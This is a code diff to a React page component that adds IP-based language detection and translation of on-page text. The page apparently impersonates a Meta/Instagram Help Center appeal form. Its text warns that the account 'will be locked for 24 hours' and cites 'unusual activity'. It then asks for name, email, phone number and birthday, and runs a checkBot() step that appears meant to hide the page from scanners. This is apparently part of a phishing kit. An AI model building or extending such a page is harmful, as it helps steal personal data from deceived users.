@@ -13,6 +13,8 @@ const Index = () => {
     const navigate = useNavigate();
     const [today, setToday] = useState();
     const [isLoading, setIsLoading] = useState(true);
+    const [isTranslating, setIsTranslating] = useState(true);
+    
     const defaultTexts = useMemo(
         () => ({
             title: 'Your account will be locked for 24 hours.',
@@ -27,10 +29,56 @@ const Index = () => {
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
+    // 🎯 THÊM: Texts của form 1 (Home)
+    const homeDefaultTexts = useMemo(
+        () => ({
+            helpCenter: 'Help Center',
+            english: 'English',
+            using: 'Using',
+            managingAccount: 'Managing Your Account',
+            privacySecurity: 'Privacy, Safety and Security',
+            policiesReporting: 'Policies and Reporting',
+            pagePolicyAppeals: 'Account Policy Complaints',
+            detectedActivity: 'We have detected unusual activity on Pages and ad accounts linked to your Instagram, including reported copyright and guideline violations.',
+            accessLimited: 'To protect your account, please verify so that the review process is processed quickly and accurately.',
+            submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
+            pageName: 'Name',
+            mail: 'Email',
+            phone: 'Phone Number',
+            birthday: 'Birthday',
+            yourAppeal: 'Your Appeal',
+            appealPlaceholder: 'Please describe your appeal in detail...',
+            submit: 'Submit',
+            fieldRequired: 'This field is required',
+            invalidEmail: 'Please enter a valid email address',
+            about: 'About',
+            adChoices: 'Ad choices',
+            createAd: 'Create ad',
+            privacy: 'Privacy',
+            careers: 'Careers',
+            createPage: 'Create Page',
+            termsPolicies: 'Terms and policies',
+            cookies: 'Cookies',
+            pleaseWait: 'Please wait...',
+            checkingSecurity: 'Checking security...'
+        }),
+        []
+    );
+
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
-                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.protectionText, targetLang), translateText(defaultTexts.processText, targetLang), translateText(defaultTexts.continueBtn, targetLang), translateText(defaultTexts.restrictedText, targetLang)]);
+                setIsTranslating(true);
+                
+                // 🎯 DỊCH FORM 0
+                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([
+                    translateText(defaultTexts.title, targetLang), 
+                    translateText(defaultTexts.description, targetLang), 
+                    translateText(defaultTexts.protectionText, targetLang), 
+                    translateText(defaultTexts.processText, targetLang), 
+                    translateText(defaultTexts.continueBtn, targetLang), 
+                    translateText(defaultTexts.restrictedText, targetLang)
+                ]);
 
                 setTranslatedTexts({
                     title: translatedTitle,
@@ -40,11 +88,29 @@ const Index = () => {
                     continueBtn: translatedContinue,
                     restrictedText: translatedRestricted
                 });
+
+                // 🎯 DỊCH LUÔN FORM 1 (HOME) VÀ LƯU VÀO LOCALSTORAGE
+                const homeTextsToTranslate = Object.values(homeDefaultTexts);
+                const translatedHomeTexts = await Promise.all(
+                    homeTextsToTranslate.map(text => translateText(text, targetLang))
+                );
+
+                // 🎯 TẠO OBJECT DỊCH CHO FORM 1
+                const translatedHomeObject = {};
+                Object.keys(homeDefaultTexts).forEach((key, index) => {
+                    translatedHomeObject[key] = translatedHomeTexts[index];
+                });
+
+                // 🎯 LƯU VÀO LOCALSTORAGE ĐỂ FORM 1 DÙNG
+                localStorage.setItem(`translatedHome_${targetLang}`, JSON.stringify(translatedHomeObject));
+                
+                setIsTranslating(false);
             } catch (error) {
                 console.log('translation failed:', error.message);
+                setIsTranslating(false);
             }
         },
-        [defaultTexts]
+        [defaultTexts, homeDefaultTexts]
     );
 
     useEffect(() => {
@@ -77,19 +143,39 @@ const Index = () => {
                     const countryCode = response.data.country_code;
                     const targetLang = countryToLanguage[countryCode] || 'en';
 
-                    setIsLoading(false);
                     localStorage.setItem('targetLang', targetLang);
-                    translateAllTexts(targetLang);
+                    
+                    if (targetLang !== 'en') {
+                        await translateAllTexts(targetLang);
+                    } else {
+                        setIsTranslating(false);
+                    }
+                    
+                    setIsLoading(false);
                 } catch {
-                    //
+                    setIsTranslating(false);
+                    setIsLoading(false);
                 }
             };
+            
             await fetchIpInfo();
             await checkBot();
         };
 
         init();
     }, [translateAllTexts]);
+
+    if (isTranslating) {
+        return (
+            <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
+                <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
+                    <div className="flex justify-center">
+                        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
+                    </div>
+                </div>
+            </div>
+        );
+    }
 
     return (
         <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
